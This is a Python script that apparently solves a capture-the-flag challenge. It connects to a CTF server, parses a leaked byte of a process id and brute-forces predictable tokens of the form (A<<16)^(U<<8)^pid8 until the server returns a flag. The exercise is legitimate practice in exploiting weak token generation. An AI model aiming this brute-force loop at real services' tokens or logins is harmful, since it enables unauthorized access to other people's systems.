#!/usr/bin/env python3
import socket
import sys
import re
import time

HOST = 'ctf.ac.upt.ro'
PORT = 9099

if len(sys.argv) >= 2:
    HOST = sys.argv[1]
if len(sys.argv) >= 3:
    PORT = int(sys.argv[2])

def compute_candidates(pid8, a_max=1024, u_max=64):
    # token = (A << 16) ^ (U << 8) ^ (pid & 0xff)
    # We only know pid & 0xff (pid8). Brute-force plausible ranges for A and U.
    for A in range(a_max + 1):
        for U in range(u_max + 1):
            yield ((A << 16) ^ (U << 8) ^ pid8)

def recv_line(sock):
    data = b''
    while True:
        ch = sock.recv(1)
        if not ch:
            return data.decode(errors='replace')
        data += ch
        if ch == b'\n':
            return data.decode(errors='replace')

def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.settimeout(5)
    # read greeting
    greet = recv_line(s)
    if not greet:
        print('[!] No greeting, server closed connection.')
        return 1
    print('[*] Greeting:', greet.strip())

    m = re.search(r'pid8\s*=\s*(\d+)', greet)
    if not m:
        print('[!] Could not parse pid8 from greeting.')
        return 2
    pid8 = int(m.group(1)) & 0xff
    print(f'[*] Parsed pid8 = {pid8}')

    # Try candidates
    sent = 0
    found = False
    # Use a socket file wrapper for simpler I/O
    f = s.makefile('rwb', buffering=0)

    # heuristic: ac ~ 90..140, uc ~ 0..20 typically; try that first fast
    ranges = [
        (range(70, 180), range(0, 25)),   # likely window
        (range(0, 1025), range(0, 65)),   # full safe window
    ]

    for Arange, Urange in ranges:
        # Build a unique list to avoid re-sending duplicates between phases
        tried = set()
        for A in Arange:
            for U in Urange:
                token = ((A << 16) ^ (U << 8) ^ pid8) & 0xffffffff
                if token in tried:
                    continue
                tried.add(token)
                f.write(f"{token}\n".encode())
                sent += 1
                # Read one response line
                line = f.readline().decode(errors='replace').strip()
                if not line:
                    print('[!] Server closed connection unexpectedly.')
                    return 3
                if line.lower().startswith('nope'):
                    if sent % 200 == 0:
                        # tiny breather to avoid flooding
                        time.sleep(0.01)
                    continue
                # If we get here, hopefully it's the flag
                print('[+] Response:', line)
                if 'ctf{' in line.lower() or 'flag{' in line.lower():
                    print('[+] Got flag:', line)
                    found = True
                    break
                # Some servers might echo something else before the flag;
                # read another line just in case.
                line2 = f.readline().decode(errors='replace').strip()
                if 'ctf{' in line2.lower() or 'flag{' in line2.lower():
                    print('[+] Got flag:', line2)
                    found = True
                    break
            if found:
                break
        if found:
            break

    if not found:
        print('[!] Exhausted search window without success. Try widening ranges.')
        return 4
    return 0

if __name__ == "__main__":
    sys.exit(main())
